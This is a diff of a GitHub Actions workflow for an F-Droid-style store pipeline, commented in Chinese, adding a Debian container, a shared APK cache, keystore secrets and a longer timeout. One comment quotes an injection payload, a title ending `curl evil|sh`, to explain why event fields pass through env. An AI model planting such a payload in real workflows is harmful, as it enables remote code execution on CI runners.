@@ -36,6 +36,8 @@ on:
 # 本仓库**只有 workflow，没有任何源码**，所以 GITHUB_TOKEN 一个权限都不需要：
 # 执行体走 PAT 从 forge-core 拉，写 store 也走同一把 PAT（§6.2 不变量 1）——
 # 而 PAT 权限是 per-repo 的，这里给得越小越好。
+#
+# ⚠️ `actions/cache` 不吃这个字段 —— 它用的是 runtime token，与 GITHUB_TOKEN 无关。
 permissions: {}
 
 # 所有会**写 store** 的 job 共用一个并发组，于是它们互相排队（见 reconcile.yml 里
@@ -43,8 +45,12 @@ permissions: {}
 # 或一个对账正推到一半另一个事件又推一次（非快进拒绝）。
 #
 # cancel-in-progress 必须是 false：这些 job 是**维护动作**，中途取消会留下
-# "asset 传了一半、清单还没重建"的中间态。排队等一会儿是更好的代价。
+# "asset 传了一半、索引还没重建"的中间态。排队等一会儿是更好的代价。
 # 一天也就几次事件，串行的代价约等于零。
+#
+# ⚠️ 这个组**同时**保护着下面那个 APK cache：两个写入口共用一盘 cache，
+# 而 `actions/cache` 的"存"发生在 job 末尾 —— 两个 job 并发时，后存的那个
+# 会拿着自己那份（可能已经过时的）目录覆盖掉先存的那份。串行 = 没有这个问题。
 concurrency:
   group: store-write
   cancel-in-progress: false
@@ -52,14 +58,63 @@ concurrency:
 jobs:
   handle:
     runs-on: ubuntu-latest
-    # 兜底。正常一次几秒到几分钟；卡住时在这里被砍掉，而不是占满 6 小时的默认额度。
-    timeout-minutes: 45
+    # ⚠️ 与 reconcile.yml 同一个容器，理由也同一条：**两个动词都会走到
+    # `fdroid update`** —— `intake-incoming` 在搬完 `_incoming` 之后调
+    # `RebuildAndCheck`（见 cmd/forge/main.go），而那一步要 fdroidserver 重建索引、
+    # 要 jarsigner 验签。少了容器，这两个动词会**在搬完文件之后**才失败，
+    # 留下一个"asset 已经进 Release、索引却没跟着更新"的状态。
+    #
+    # ubuntu-latest 自带的 fdroidserver 2.2.1 解析现代 APK 会直接崩，
+    # trixie 的才行（实测，见 reconcile.yml 里那段注释）。
+    container:
+      image: debian:trixie
+    # ⚠️ 容器 job 的默认 shell 是 **sh（dash）**，Debian 基础镜像里没有 bash。
+    defaults:
+      run:
+        shell: bash
+    # 从 45 放宽到 120：**这个 job 与 reconcile 干的是同一件事** ——
+    # `intake-incoming` 走完搬运之后照样要跑 `RebuildAndCheck`（下载缺失 APK、
+    # 让 fdroidserver 解析整个 repo/、验签）。既然实务量一模一样，
+    # 给一个更小的上界只会让它变成"随机地在某一轮红掉"。
+    # 它是一个**上界**不是预留：正常一轮几秒到几分钟，只有真卡住时才会碰到它。
+    timeout-minutes: 120
     env:
       # 上游 asset 名。action 按 **asset 原名**落盘、不改成别的名字，所以它同时
       # 就是本地文件名 —— 下面 `Make executable` 与各 run: 步骤都靠它拼路径。
       # ⚠️ 改这里要同时改 `Fetch executor` 的 `with.fileName`（两处必须一致）。
       EXEC_ASSET: forge-linux-amd64
+
+      # ⚠️ **必须与 reconcile.yml 用同一盘 cache、同一个 key 前缀。**
+      # 这里最容易想错的地方是"事件处理不碰索引，不需要 cache" —— 它碰。
+      # 一条 `intake-incoming` 就是一个应用的新版本进索引，而索引里**其余**
+      # 老版本的 APK 得在这一轮里凑齐：凑不齐它们就从索引里消失
+      # （"只下最新版、老版本只从 cache 取"，见 03 §5.1）。
+      # 少了 cache，一次搬运会把整个索引**缩小**到只剩最新版，然后推出去。
+      APK_CACHE_DIR: ${{ github.workspace }}/apk-cache
     steps:
+      # 与 reconcile.yml 完全同一份工具链，理由逐条相同（含那条最不显眼的
+      # `git` —— 二进制靠它克隆并回写 store，而 Debian 基础镜像里没有 git）。
+      # 这里不重复那一段注释，改动时**两个文件要一起改**。
+      - name: Install the toolchain
+        run: |
+          set -euo pipefail
+          apt-get update -qq
+          apt-get install -y -qq --no-install-recommends \
+            fdroidserver default-jdk-headless bash nodejs git \
+            unzip jq curl ca-certificates
+
+          {
+            echo "### 环境"
+            echo
+            echo '| 工具 | 输出 |'
+            echo '|---|---|'
+            echo "| \`fdroid\` | $(fdroid --version 2>&1 | head -1) |"
+            echo "| \`jarsigner\` | \`$(command -v jarsigner || echo '**不在 PATH**')\` |"
+            echo "| \`git\` | $(git --version 2>&1) |"
+            echo "| \`node\` | $(node --version 2>&1 | head -1) |"
+            echo
+          } >> "$GITHUB_STEP_SUMMARY"
+
       # 本 job **不 checkout 任何东西** —— 这里没有源码要取，而 store 是二进制
       # 自己浅克隆的（STORE_DIR 留空）。二进制的 git 封装用 `-c credential.helper=`
       # 一次性传凭据，token 不落盘。
@@ -76,6 +131,18 @@ jobs:
         env:
           MASK: ${{ secrets.GH_PAT }}
         run: echo "::add-mask::$MASK"
+
+      # 与 reconcile.yml 同一盘 cache（同一个 key 前缀 `fdroid-apks-v1-`），
+      # 于是两个写入口互相接力：一个搬完留下的 APK，另一个下一轮直接命中。
+      # key 里同样带 `run_id`，保证每轮都**存一份新的**（见 reconcile.yml 里
+      # 为什么必须是滚动 key 的那段）。
+      - name: Restore the APK cache
+        uses: actions/cache@v6
+        with:
+          path: ${{ env.APK_CACHE_DIR }}
+          key: fdroid-apks-v1-${{ github.run_id }}
+          restore-keys: |
+            fdroid-apks-v1-
 
       - name: Fetch executor
         uses: robinraju/release-downloader@v1
@@ -102,6 +169,9 @@ jobs:
           # 这一条与 store 侧 forward.yml 是同一个理由：`${{ }}` 在 run: 里是
           # 文本拼接，issue 标题里放一个 `"; curl evil|sh; #` 就能执行。
           STORE_TOKEN: ${{ secrets.GH_PAT }}
+          REPO_KEYSTORE_B64: ${{ secrets.REPO_KEYSTORE_B64 }}
+          REPO_KEYSTORE_PASS: ${{ secrets.REPO_KEYSTORE_PASS }}
+          REPO_KEY_PASS: ${{ secrets.REPO_KEY_PASS }}
           # 手动按钮时 client_payload 不存在，于是落到第一个分支（verb）。
           EVENT: ${{ github.event.inputs.verb || github.event.client_payload.event || github.event_name }}
           ISSUE: ${{ github.event.client_payload.issue }}
@@ -111,8 +181,20 @@ jobs:
           set -euo pipefail
           # 这里**不再**掩码：上面那个 `Mask token` 步骤已经 job 级生效（同一把 PAT），
           # 而二进制启动后第一件事也是 env.AddMask()。再掩一次是纯重复。
+
+          # 与 reconcile.yml 同一条现场证据：搬运这一轮里，索引中老版本的 APK
+          # 是从 cache 凑出来的。这里是 0 就说明搬运会**缩小**索引（见上面那段）。
+          mkdir -p "$APK_CACHE_DIR"
+          echo "cache 目录 $APK_CACHE_DIR 里有 $(find "$APK_CACHE_DIR" -name '*.apk' | wc -l) 个 APK"
+
           "$GITHUB_WORKSPACE/$EXEC_ASSET" handle-dispatch
 
+      # ⚠️ 这里**刻意没有** reconcile.yml 里那条「发布物核对」。
+      # 理由不是省事：那一条验的是**签名指纹**，而指纹只由 keystore 决定 ——
+      # 本 job 与 reconcile 用的是同一个 secret、同一个二进制，指纹不可能在这里
+      # 换一把。把这套克隆 + 核对搬过来，只会让每一次人手点的维护动作都多花
+      # 十几秒，去重复一件一天后就会自动被复核的事（下一次 reconcile）。
+      #
       # 注意手动按钮时 client_payload 是空的，EVENT 就是上面那个 verb：
       # 默认的 intake-incoming = 搬一次队列（§3.2），选 reconcile = 全量对账（§4.3）。
       # 缺省值刻意选"搬队列"：手动点这个按钮的九成场景是刚往 _incoming 传完文件。
